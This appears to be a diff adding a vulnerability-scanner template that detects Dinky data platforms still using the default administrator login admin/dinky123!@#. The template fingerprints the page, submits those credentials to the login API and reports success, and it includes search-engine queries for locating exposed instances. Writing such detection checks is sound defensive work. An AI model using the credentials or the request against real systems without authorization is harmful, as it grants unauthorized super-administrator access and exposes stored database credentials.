@@ -1,0 +1,67 @@
+id: dinky-default-login
+
+info:
+  name: Dinky - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Dinky ships with the default administrator credentials admin/dinky123!@#. An attacker can log in to the real-time data development platform as super administrator and create or submit Flink SQL jobs, manage data sources and read stored database credentials.
+  reference:
+    - https://github.com/DataLinkDC/dinky/blob/v1.2.5/docs/docs/get_started/quick_experience.md
+    - https://github.com/DataLinkDC/dinky/blob/v1.2.5/script/sql/dinky-mysql.sql
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: datalinkdc
+    product: dinky
+    shodan-query: http.title:"Dinky"
+    fofa-query: title="Dinky"
+  tags: dinky,datalinkdc,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Dinky</title>")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}","ldapLogin":false,"autoLogin":true}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - dinky123!@#
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "\"success\":true")'
+          - 'contains(body, "\"code\":0")'
+          - 'contains(body, "\"username\":\"admin\"")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
